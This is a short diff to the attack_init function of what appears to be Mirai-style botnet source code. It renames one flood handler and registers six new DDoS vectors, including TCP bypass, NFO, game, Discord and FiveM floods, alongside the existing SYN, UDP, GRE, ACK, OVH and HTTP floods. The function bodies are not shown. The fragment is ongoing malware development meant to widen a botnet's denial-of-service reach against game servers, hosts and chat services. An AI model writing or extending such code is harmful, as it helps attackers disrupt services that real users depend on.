@@ -27,7 +27,7 @@ BOOL attack_init(void)
 
     add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
     add_attack(ATK_VEC_UDP_FLOOD, (ATTACK_FUNC)attack_udp_thread);
-    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_method_nudp);
+    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_nudp);
     add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
     add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
     add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
@@ -39,6 +39,12 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_OVH, (ATTACK_FUNC)attack_ovh);
     add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_stomp);
     add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
+    add_attack(ATK_VEC_TCPBYPASS, (ATTACK_FUNC)attack_tcp_bypass);
+    add_attack(ATK_VEC_NFO, (ATTACK_FUNC)attack_nfo);
+    add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
+    add_attack(ATK_VEC_GAME, (ATTACK_FUNC)attack_game);
+    add_attack(ATK_VEC_DISCORD, (ATTACK_FUNC)attack_discord);
+    add_attack(ATK_VEC_FIVEM, (ATTACK_FUNC)attack_fivem);
 
     return TRUE;
 }
